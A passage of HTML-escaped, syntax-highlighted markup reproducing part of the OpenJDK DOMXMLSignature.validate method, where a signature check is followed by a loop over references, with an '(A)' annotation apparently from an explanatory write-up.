vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;// https://github.com/openjdk/jdk/blob/master/src/java.xml.crypto/share/classes/org/jcp/xml/dsig/internal/dom/DOMXMLSignature.java&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;@Override&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;public&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;boolean&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validate&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XMLValidateContext&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; vc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;throws&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XMLSignatureException&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[..]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;// validate the signature&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;boolean&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; sigValidity &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; sv&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;validate&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;vc&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;A&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(!&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;sigValidity&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validationStatus &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;false&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validated &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;true&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;return&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validationStatus&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;// validate all References&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;@SuppressWarnings&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"unchecked\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;List&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Reference&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;gt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refs &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;this&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;si&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;getReferences&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;boolean&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validateRefs &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;true&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;for&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;int&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; i &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;,&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; size &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; refs&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;size&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;();&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; validateRefs &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; i &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; size&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;;&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; i&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;++)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: 